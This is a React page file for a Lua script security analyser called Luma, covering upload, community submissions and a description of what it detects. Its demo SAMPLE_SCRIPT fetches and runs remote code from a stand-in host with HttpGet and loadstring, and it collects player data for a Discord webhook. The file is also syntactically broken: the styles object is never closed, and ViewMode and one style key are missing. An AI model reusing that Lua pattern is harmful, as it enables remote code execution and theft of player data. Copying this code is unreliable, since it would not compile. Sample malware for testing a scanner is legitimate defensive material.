'use client';

import { useState, useCallback, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { FileUpload } from '@/components/file-upload';
import { ScanResults } from '@/components/scan-results';
import { CommunitySubmissions } from '@/components/community-submissions';
import { AuthModal } from '@/components/auth-modal';
import { SubmissionModal } from '@/components/submission-modal';
import { ProfileModal } from '@/components/profile-modal';
import { CustomModal, useModal } from '@/components/custom-modal';
import { ScanningAnimation } from '@/components/scanning-animation';
import { ScanReport } from '@/types';
import { Shield, Github, Users, User, LogOut, Trophy, Play, ShieldCheck, Lock, Server, MessageSquare, AlertTriangle, CheckCircle, FileSearch, Globe, Binary, Eye, Code2, Database, Timer, Layers } from 'lucide-react';

const SAMPLE_SCRIPT = `-- Example Lua Script for Demo
local function suspiciousFunction()
    -- Attempting to access external resource
    local url = "https://malicious-site.com/steal"
    local data = game:HttpGet(url)
    
    -- Loading remote code (dangerous)
    local remoteCode = loadstring(data)
    if remoteCode then
        remoteCode()
    end
end

-- Obfuscated variable names
local _a = getfenv()
local _b = _a["game"]
local _c = _b["Players"]

-- Webhook exfiltration
local webhook = "discord.com/api/webhooks/123456/token"
local playerData = {}

for _, player in ipairs(_c:GetPlayers()) do
    table.insert(playerData, {
        name = player.Name,
        id = player.UserId,
        ip = tostring(player)
    })
end

-- Send to external server
local jsonData = game:GetService("HttpService"):JSONEncode(playerData)
suspiciousFunction()`;

interface User {
  id: string;
  username: string;
  email: string;
  emailVerified: boolean;
  bio?: string;
  stats?: {
    scansPerformed: number;
    scriptsSubmitted: number;
    totalUpvotes: number;
    joinedAt: string;
  };
}

const styles = {
  main: {
    minHeight: '100vh',
    backgroundColor: '#0a0a0a',
    fontFamily: 'system-ui, -apple-system, sans-serif',
  },
  header: {
    borderBottom: '1px solid rgba(255, 255, 255, 0.06)',
    backgroundColor: 'rgba(10, 10, 10, 0.8)',
  },
  headerInner: {
    maxWidth: '1200px',
    margin: '0 auto',
    padding: '16px 24px',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'space-between',
  },
  logo: {
    display: 'flex',
    alignItems: 'center',
    gap: '10px',
  },
  logoIcon: {
    width: '32px',
    height: '32px',
    borderRadius: '6px',
    backgroundColor: 'rgba(255, 255, 255, 0.1)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
  },
  logoText: {
    fontSize: '18px',
    fontWeight: 600,
    color: '#ffffff',
  },
  nav: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
  },
  navButton: (isActive: boolean) => ({
    display: 'flex',
    alignItems: 'center',
    gap: '6px',
    padding: '8px 14px',
    borderRadius: '4px',
    backgroundColor: isActive ? 'rgba(255, 255, 255, 0.1)' : 'transparent',
    border: 'none',
    color: isActive ? '#ffffff' : 'rgba(255, 255, 255, 0.6)',
    fontSize: '13px',
    fontWeight: 500,
    cursor: 'pointer',
    transition: 'all 0.2s',
  }),
  authButton: (isLoggedIn: boolean) => ({
    display: 'flex',
    alignItems: 'center',
    gap: '6px',
    padding: '8px 14px',
    borderRadius: '4px',
    backgroundColor: isLoggedIn ? 'rgba(239, 68, 68, 0.1)' : 'rgba(59, 130, 246, 0.1)',
    border: `1px solid ${isLoggedIn ? 'rgba(239, 68, 68, 0.2)' : 'rgba(59, 130, 246, 0.2)'}`,
    color: isLoggedIn ? '#ef4444' : '#3b82f6',
    fontSize: '13px',
    fontWeight: 500,
    cursor: 'pointer',
  }),
  userDisplay: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    padding: '6px 12px',
    borderRadius: '4px',
    backgroundColor: 'rgba(255, 255, 255, 0.05)',
    fontSize: '13px',
    color: 'rgba(255, 255, 255, 0.8)',
    cursor: 'pointer',
    transition: 'all 0.2s',
    ':hover': {
      backgroundColor: 'rgba(255, 255, 255, 0.08)',
    },
  },
  githubLink: {
    display: 'flex',
    alignItems: 'center',
    gap: '6px',
    padding: '8px 14px',
    borderRadius: '4px',
    backgroundColor: 'rgba(255, 255, 255, 0.05)',
    border: '1px solid rgba(255, 255, 255, 0.08)',
    color: 'rgba(255, 255, 255, 0.6)',
    textDecoration: 'none',
    fontSize: '13px',
  },
  hero: {
    maxWidth: '800px',
    margin: '0 auto',
    padding: '48px 24px 32px',
    textAlign: 'center' as const,
  },
  title: {
    fontSize: '32px',
    fontWeight: 600,
    color: '#ffffff',
    marginBottom: '12px',
  },
  subtitle: {
    fontSize: '15px',
    color: 'rgba(255, 255, 255, 0.5)',
    lineHeight: 1.5,
  },
  mainArea: {
    maxWidth: '800px',
    margin: '0 auto',
    padding: '0 24px 48px',
  },
  card: {
    backgroundColor: 'rgba(255, 255, 255, 0.02)',
    borderRadius: '8px',
    padding: '24px',
    border: '1px solid rgba(255, 255, 255, 0.06)',
  },
  backButton: {
    display: 'block',
    width: '100%',
    padding: '12px',
    marginTop: '16px',
    borderRadius: '6px',
    backgroundColor: 'rgba(255, 255, 255, 0.05)',
    border: '1px solid rgba(255, 255, 255, 0.08)',
    color: 'rgba(255, 255, 255, 0.7)',
    fontSize: '14px',
    cursor: 'pointer',
  },
  errorBox: {
    marginTop: '16px',
    padding: '12px 16px',
    borderRadius: '6px',
    backgroundColor: 'rgba(239, 68, 68, 0.08)',
    border: '1px solid rgba(239, 68, 68, 0.15)',
    color: '#f87171',
    fontSize: '13px',
  },
  bulkResults: {
    display: 'flex',
    flexDirection: 'column' as const,
    gap: '16px',
  },
  bulkItem: {
    backgroundColor: 'rgba(255, 255, 255, 0.02)',
    borderRadius: '8px',
    padding: '16px',
    border: '1px solid rgba(255, 255, 255, 0.06)',
  },
  bulkHeader: {
    display: 'flex',
    justifyContent: 'space-between',
    alignItems: 'center',
    marginBottom: '12px',
  },
  bulkFileName: {
    fontSize: '14px',
    fontWeight: 600,
    color: '#ffffff',
  },
  bulkScore: (score: number) => ({
    fontSize: '16px',
    fontWeight: 700,
    color: score <= 20 ? '#22c55e' : 
           score <= 40 ? '#f59e0b' : 
           score <= 60 ? '#f97316' : 
           score <= 80 ? '#ef4444' : '#dc2626',
  }),
  footer: {
    borderTop: '1px solid rgba(255, 255, 255, 0.06)',
    padding: '24px',
    textAlign: 'center' as const,
  },
  footerText: {
    fontSize: '13px',
    color: 'rgba(255, 255, 255, 0.3)',
  },
  loginPrompt: {
    padding: '16px',
    borderRadius: '8px',
    backgroundColor: 'rgba(59, 130, 246, 0.1)',
    border: '1px solid rgba(59, 130, 246, 0.2)',
    color: '#3b82f6',
    fontSize: '14px',
    textAlign: 'center' as const,
    marginTop: '16px',
  },
  sampleButton: {
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
    padding: '12px 20px',
    borderRadius: '6px',
    backgroundColor: 'rgba(34, 197, 94, 0.1)',
    border: '1px solid rgba(34, 197, 94, 0.2)',
    color: '#22c55e',
    fontSize: '14px',
    fontWeight: 500,
    cursor: 'pointer',
    marginTop: '16px',
    transition: 'all 0.2s',
  },
  infoSection: {
    marginTop: '32px',
    padding: '24px',
    backgroundColor: 'rgba(255, 255, 255, 0.02)',
    borderRadius: '8px',
    border: '1px solid rgba(255, 255, 255, 0.06)',
  },
  infoTitle: {
    fontSize: '16px',
    fontWeight: 600,
    color: '#ffffff',
    marginBottom: '16px',
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
  },
  infoGrid: {
    display: 'grid',
    gridTemplateColumns: 'repeat(auto-fit, minmax(250px, 1fr))',
    gap: '16px',
  },
  infoItem: {
    display: 'flex',
    alignItems: 'flex-start',
    gap: '12px',
    padding: '12px',
    backgroundColor: 'rgba(255, 255, 255, 0.03)',
    borderRadius: '6px',
  },
  infoIcon: {
    width: '32px',
    height: '32px',
    borderRadius: '6px',
    backgroundColor: 'rgba(59, 130, 246, 0.1)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    flexShrink: 0,
  },
  infoText: {
    fontSize: '13px',
    color: 'rgba(255, 255, 255, 0.6)',
    lineHeight: 1.5,
  },
  infoLabel: {
    fontSize: '13px',
    fontWeight: 600,
    color: '#ffffff',
    marginBottom: '4px',
  },
  privacyBox: {
    marginTop: '24px',
    padding: '16px',
    backgroundColor: 'rgba(34, 197, 94, 0.05)',
    borderRadius: '8px',
    border: '1px solid rgba(34, 197, 94, 0.15)',
  },
  privacyTitle: {
    fontSize: '14px',
    fontWeight: 600,
    color: '#22c55e',
    marginBottom: '8px',
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
  },
  privacyText: {
    fontSize: '13px',
    color: 'rgba(255, 255, 255, 0.6)',
    lineHeight: 1.5,
  },
  limitsBox: {
    marginTop: '24px',
    padding: '16px',
    backgroundColor: 'rgba(245, 158, 11, 0.05)',
    borderRadius: '8px',
    border: '1px solid rgba(245, 158, 11, 0.15)',
  },
  limitsTitle: {
    fontSize: '14px',
    fontWeight: 600,
    color: '#f59e0b',
    marginBottom: '8px',
    display: 'flex',
    alignItems: 'center',
    gap: '8px',
  },
  discordBadge: {
    display: 'inline-flex',
    alignItems: 'center',
    gap: '6px',
    padding: '6px 12px',
    backgroundColor: 'rgba(88, 101, 242, 0.1)',
    border: '1px solid rgba(88, 101, 242, 0.2)',
    borderRadius: '4px',
    fontSize: '12px',
    color: '#5865f2',
    marginTop: '12px',
  },

export default function Home() {
  const [viewMode, setViewMode] = useState<ViewMode>('scan');
  const [isScanning, setIsScanning] = useState(false);
  const [report, setReport] = useState<ScanReport | null>(null);
  const [bulkReports, setBulkReports] = useState<ScanReport[]>([]);
  const [error, setError] = useState<string | null>(null);
  
  // Auth state
  const [user, setUser] = useState<User | null>(null);
  const [authModalOpen, setAuthModalOpen] = useState(false);
  const [profileModalOpen, setProfileModalOpen] = useState(false);
  const [profileUser, setProfileUser] = useState<User | null>(null);
  
  // Submission modal state
  const [submissionModalOpen, setSubmissionModalOpen] = useState(false);
  const [submissionReport, setSubmissionReport] = useState<ScanReport | null>(null);

  // Custom modal hook
  const { state: modalState, closeModal: closeCustomModal, success, error: showError } = useModal();

  // Check for existing session on load
  useEffect(() => {
    checkSession();
  }, []);

  const checkSession = async () => {
    try {
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'check-session' }),
      });
      
      const data = await response.json();
      if (data.success) {
        setUser(data.user);
      }
    } catch (error) {
      console.error('Session check failed:', error);
    }
  };

  const handleAuth = (userData: User) => {
    setUser(userData);
    success(`Welcome, ${userData.username}!`);
  };

  const handleLogout = async () => {
    await fetch('/api/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'logout' }),
    });
    setUser(null);
    success('Logged out successfully');
  };

  const openProfile = async (username?: string) => {
    try {
      const url = username ? `/api/profile?username=${username}` : '/api/profile';
      const response = await fetch(url);
      const data = await response.json();
      
      if (data.success) {
        setProfileUser(data.user);
        setProfileModalOpen(true);
      }
    } catch (error) {
      showError('Failed to load profile');
    }
  };

  const handleUpdateBio = async (bio: string) => {
    if (!user) return;
    
    try {
      const response = await fetch('/api/auth', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'update-bio', bio }),
      });
      
      const data = await response.json();
      if (data.success) {
        setUser({ ...user, bio });
        setProfileUser(profileUser ? { ...profileUser, bio } : null);
        success('Bio updated successfully');
      } else {
        showError(data.error || 'Failed to update bio');
      }
    } catch (error) {
      showError('Failed to update bio');
    }
  };

  const handleFileSelect = useCallback(async (file: File) => {
    setIsScanning(true);
    setError(null);
    setReport(null);

    try {
      const formData = new FormData();
      formData.append('file', file);

      const response = await fetch('/api/analyze', {
        method: 'POST',
        body: formData,
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to analyze script');
      }

      const data = await response.json();
      setReport(data.report);
      
      // Increment scan stat if user is logged in
      if (user) {
        await fetch('/api/auth', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ action: 'increment-scan' }),
        });
      }
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setIsScanning(false);
    }
  }, [user]);

  const handleCodePaste = useCallback(async (code: string) => {
    setIsScanning(true);
    setError(null);
    setReport(null);

    try {
      const formData = new FormData();
      formData.append('code', code);

      const response = await fetch('/api/analyze', {
        method: 'POST',
        body: formData,
      });

      if (!response.ok) {
        const data = await response.json();
        throw new Error(data.error || 'Failed to analyze script');
      }

      const data = await response.json();
      setReport(data.report);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setIsScanning(false);
    }
  }, []);

  const handleBulkUpload = useCallback(async (files: File[]) => {
    setIsScanning(true);
    setError(null);
    setBulkReports([]);
    setReport(null);

    const reports: ScanReport[] = [];

    try {
      for (const file of files) {
        const formData = new FormData();
        formData.append('file', file);

        const response = await fetch('/api/analyze', {
          method: 'POST',
          body: formData,
        });

        if (response.ok) {
          const data = await response.json();
          reports.push(data.report);
        }
      }

      setBulkReports(reports);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'An error occurred');
    } finally {
      setIsScanning(false);
    }
  }, []);

  const handleDownloadReport = useCallback(() => {
    if (!report) return;

    const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `luma-report-${report.id}.json`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }, [report]);

  const resetScan = useCallback(() => {
    setReport(null);
    setBulkReports([]);
    setError(null);
  }, []);

  const openSubmissionModal = (reportToSubmit: ScanReport) => {
    if (!user) {
      setAuthModalOpen(true);
      return;
    }
    setSubmissionReport(reportToSubmit);
    setSubmissionModalOpen(true);
  };

  const handleSampleScript = useCallback(async () => {
    handleCodePaste(SAMPLE_SCRIPT);
  }, [handleCodePaste]);

  const handleSubmitToCommunity = async (details: { scriptName: string; description: string; source?: string; tags: string[] }) => {
    if (!submissionReport || !user) return;
    
    try {
      const response = await fetch('/api/community', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          report: submissionReport,
          details,
        }),
      });
      
      const data = await response.json();
      if (data.success) {
        success('Script submitted to community successfully!');
        setSubmissionModalOpen(false);
        setSubmissionReport(null);
      } else {
        showError(data.error || 'Failed to submit');
      }
    } catch (error) {
      showError('Failed to submit to community');
    }
  };

  return (
    <main style={styles.main}>
      {/* Custom Modal */}
      <CustomModal state={modalState} onClose={closeCustomModal} />
      
      {/* Auth Modal */}
      <AuthModal
        isOpen={authModalOpen}
        onClose={() => setAuthModalOpen(false)}
        onAuth={handleAuth}
      />

      {/* Profile Modal */}
      {profileUser && (
        <ProfileModal
          isOpen={profileModalOpen}
          onClose={() => setProfileModalOpen(false)}
          user={profileUser}
          isOwnProfile={user?.id === profileUser.id}
          onUpdateBio={handleUpdateBio}
        />
      )}

      {/* Submission Modal */}
      {submissionReport && (
        <SubmissionModal
          isOpen={submissionModalOpen}
          onClose={() => setSubmissionModalOpen(false)}
          report={submissionReport}
          user={user}
          onSubmit={handleSubmitToCommunity}
        />
      )}

      {/* Header */}
      <header style={styles.header}>
        <div style={styles.headerInner}>
          <div style={styles.logo}>
            <div style={styles.logoIcon}>
              <Shield style={{ width: '18px', height: '18px', color: '#ffffff' }} />
            </div>
            <span style={styles.logoText}>Luma</span>
          </div>

          <nav style={styles.nav}>
            <button
              onClick={() => { setViewMode('scan'); resetScan(); }}
              style={styles.navButton(viewMode === 'scan')}
            >
              <Shield style={{ width: '14px', height: '14px' }} />
              <span>Scan</span>
            </button>
            <button
              onClick={() => setViewMode('community')}
              style={styles.navButton(viewMode === 'community')}
            >
              <Users style={{ width: '14px', height: '14px' }} />
              <span>Community</span>
            </button>
          </nav>

          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            {user ? (
              <>
                <div 
                  style={styles.userDisplay}
                  onClick={() => openProfile()}
                >
                  <User style={{ width: '14px', height: '14px' }} />
                  <span>{user.username}</span>
                </div>
                <button
                  onClick={handleLogout}
                  style={styles.authButton(true)}
                >
                  <LogOut style={{ width: '14px', height: '14px' }} />
                  <span>Logout</span>
                </button>
              </>
            ) : (
              <button
                onClick={() => setAuthModalOpen(true)}
                style={styles.authButton(false)}
              >
                <User style={{ width: '14px', height: '14px' }} />
                <span>Sign In</span>
              </button>
            )}

            <a
              href="https://github.com/markjones22347-ops/luma-analyzer"
              target="_blank"
              rel="noopener noreferrer"
              style={styles.githubLink}
            >
              <Github style={{ width: '14px', height: '14px' }} />
              <span>GitHub</span>
            </a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      {viewMode === 'scan' && (
        <>
          {/* Hero */}
          <section style={styles.hero}>
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.4 }}
            >
              <h1 style={styles.title}>Lua Script Analyzer</h1>
              <p style={styles.subtitle}>
                Static analysis for Lua scripts. Detect malicious patterns, obfuscation, 
                and security risks without executing code.
              </p>
            </motion.div>
          </section>

          {/* Scan Area */}
          <div style={styles.mainArea}>
            <div style={styles.card}>
              <AnimatePresence mode="wait">
                {report ? (
                  <motion.div
                    key="results"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                  >
                    <ScanResults 
                      report={report} 
                      onDownload={handleDownloadReport}
                      onSubmitToCommunity={openSubmissionModal}
                    />
                    
                    {!user && report.riskScore >= 41 && (
                      <div style={styles.loginPrompt}>
                        <p>Sign in to submit this script to the community database</p>
                        <button 
                          onClick={() => setAuthModalOpen(true)}
                          style={styles.loginPromptButton}
                        >
                          Sign In to Submit
                        </button>
                      </div>
                    )}
                    
                    <button onClick={resetScan} style={styles.backButton}>
                      Analyze Another Script
                    </button>
                  </motion.div>
                ) : bulkReports.length > 0 ? (
                  <motion.div
                    key="bulk-results"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                  >
                    <h3 style={{ fontSize: '18px', fontWeight: 600, color: '#ffffff', marginBottom: '16px' }}>
                      Bulk Analysis Results ({bulkReports.length} files)
                    </h3>
                    <div style={styles.bulkResults}>
                      {bulkReports.map((r, i) => (
                        <div key={r.id} style={styles.bulkItem}>
                          <div style={styles.bulkHeader}>
                            <span style={styles.bulkFileName}>
                              {i + 1}. {r.fileMetadata.filename || 'Pasted Code'}
                            </span>
                            <span style={styles.bulkScore(r.riskScore)}>
                              {r.riskScore}/100 - {r.rating}
                            </span>
                          </div>
                          <p style={{ fontSize: '13px', color: 'rgba(255,255,255,0.5)', marginBottom: '8px' }}>
                            {r.summary.substring(0, 100)}...
                          </p>
                          {r.riskScore >= 41 && (
                            <button
                              onClick={() => openSubmissionModal(r)}
                              style={{
                                padding: '6px 12px',
                                borderRadius: '4px',
                                backgroundColor: user ? 'rgba(59, 130, 246, 0.1)' : 'rgba(255, 255, 255, 0.05)',
                                border: `1px solid ${user ? 'rgba(59, 130, 246, 0.2)' : 'rgba(255, 255, 255, 0.1)'}`,
                                color: user ? '#3b82f6' : 'rgba(255, 255, 255, 0.5)',
                                fontSize: '12px',
                                cursor: 'pointer',
                              }}
                            >
                              {user ? 'Submit to Community' : 'Sign in to Submit'}
                            </button>
                          )}
                        </div>
                      ))}
                    </div>
                    <button onClick={resetScan} style={styles.backButton}>
                      Analyze More Files
                    </button>
                  </motion.div>
                ) : (
                  <motion.div
                    key="upload"
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    exit={{ opacity: 0 }}
                  >
                    {isScanning ? (
                      <ScanningAnimation />
                    ) : (
                      <>
                        <FileUpload 
                          onFileSelect={handleFileSelect} 
                          onCodePaste={handleCodePaste}
                          onBulkUpload={handleBulkUpload}
                        />
                        
                        {/* Try with Sample Script Button */}
                        <button
                          onClick={handleSampleScript}
                          style={styles.sampleButton}
                        >
                          <Play style={{ width: '16px', height: '16px' }} />
                          <span>Try with Sample Script</span>
                        </button>
                        
                        {error && (
                          <motion.div
                            initial={{ opacity: 0 }}
                            animate={{ opacity: 1 }}
                            style={styles.errorBox}
                          >
                            {error}
                          </motion.div>
                        )}
                      </>
                    )}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Privacy Statement */}
            <div style={styles.privacyBox}>
              <div style={styles.privacyTitle}>
                <ShieldCheck style={{ width: '18px', height: '18px' }} />
                <span>Privacy & Security</span>
              </div>
              <p style={styles.privacyText}>
                <strong>Your code is safe.</strong> Analysis happens entirely in-memory on our servers. 
                Uploaded scripts are never saved to disk or database (unless you explicitly submit to Community). 
                Files are analyzed immediately and discarded after processing. 
                We do not store, share, or retain your private scripts.
              </p>
            </div>

            {/* What We Detect */}
            <div style={styles.infoSection}>
              <div style={styles.infoTitle}>
                <Eye style={{ width: '20px', height: '20px', color: '#3b82f6' }} />
                <span>What We Detect</span>
              </div>
              <div style={styles.infoGrid}>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <Globe style={{ width: '18px', height: '18px', color: '#3b82f6' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Webhook & HTTP Activity</div>
                    <p style={styles.infoText}>Discord webhooks, HttpGet requests, and external data exfiltration attempts</p>
                  </div>
                </div>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <Code2 style={{ width: '18px', height: '18px', color: '#f59e0b' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Remote Code Execution</div>
                    <p style={styles.infoText}>loadstring calls, bytecode loading, and dynamic code execution chains</p>
                  </div>
                </div>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <Database style={{ width: '18px', height: '18px', color: '#22c55e' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Environment Manipulation</div>
                    <p style={styles.infoText}>getgenv, getfenv, setfenv, and global environment tampering</p>
                  </div>
                </div>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <Binary style={{ width: '18px', height: '18px', color: '#f97316' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Bytecode & Encoding</div>
                    <p style={styles.infoText}>Compiled bytecode detection, base64 encoding, and obfuscation patterns</p>
                  </div>
                </div>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <FileSearch style={{ width: '18px', height: '18px', color: '#8b5cf6' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Obfuscation Patterns</div>
                    <p style={styles.infoText}>String concatenation, variable name mangling, and anti-analysis techniques</p>
                  </div>
                </div>
                <div style={styles.infoItem}>
                  <div style={styles.infoIcon}>
                    <Lock style={{ width: '18px', height: '18px', color: '#ef4444' }} />
                  </div>
                  <div>
                    <div style={styles.infoLabel}>Player Data Access</div>
                    <p style={styles.infoText}>Attempts to access player information, UserIds, or sensitive game data</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Usage Limits */}
            <div style={styles.limitsBox}>
              <div style={styles.limitsTitle}>
                <AlertTriangle style={{ width: '18px', height: '18px' }} />
                <span>Usage Limits & Technical Constraints</span>
              </div>
              <ul style={{ ...styles.privacyText, margin: 0, paddingLeft: '16px' }}>
                <li>Maximum file size: 500 KB per script</li>
                <li>Maximum recursion depth: 10 levels for function calls</li>
                <li>Rate limiting: 10 scans per minute per IP</li>
                <li>Link following: External includes are not resolved</li>
                <li>Large scripts may be truncated if they exceed analysis limits</li>
              </ul>
            </div>

            {/* Discord Bot Status */}
            <div style={{ ...styles.limitsBox, backgroundColor: 'rgba(88, 101, 242, 0.05)', border: '1px solid rgba(88, 101, 242, 0.15)' }}>
              <div style={{ ...styles.limitsTitle, color: '#5865f2' }}>
                <MessageSquare style={{ width: '18px', height: '18px' }} />
                <span>Discord Bot Integration</span>
              </div>
              <p style={styles.privacyText}>
                Discord Bot: <strong style={{ color: '#5865f2' }}>Coming Soon</strong> — Scan scripts directly from your Discord server.
              </p>
            </div>
          </div>
        </>
      )}

      {viewMode === 'community' && (
        <div style={styles.mainArea}>
          <CommunitySubmissions 
            currentUser={user}
            onOpenProfile={openProfile}
          />
        </div>
      )}

      {/* Footer */}
      <footer style={styles.footer}>
        <p style={styles.footerText}>
          Static analysis only. No code execution. Community-powered security.
        </p>
      </footer>
    </main>
  );
}
